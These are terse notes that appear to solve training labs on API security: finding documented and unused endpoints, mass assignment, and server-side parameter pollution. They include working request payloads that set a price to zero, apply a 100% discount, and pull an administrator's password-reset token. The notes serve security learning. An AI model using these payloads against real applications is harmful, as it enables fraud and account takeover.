# API Testing

## Lab: Exploiting an API endpoint using documentation
`/api` endpoint defines APIs.


## Lab: Finding and exploiting an unused API endpoint
PATCH, `/api/products/1/price`, `{"price": 0}`



## Lab: Exploiting a mass assignment vulnerability

POST: `/api/checkout`  
```json
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

## Lab: Exploiting server-side parameter pollution in a query string

1. forget-password-page, a js exposed the `reset_token` field;
2. `POST /forgot-password` to exploit server parameters;
3. `&username=administrator%26field=reset_token` get the reset_token used to reset password.

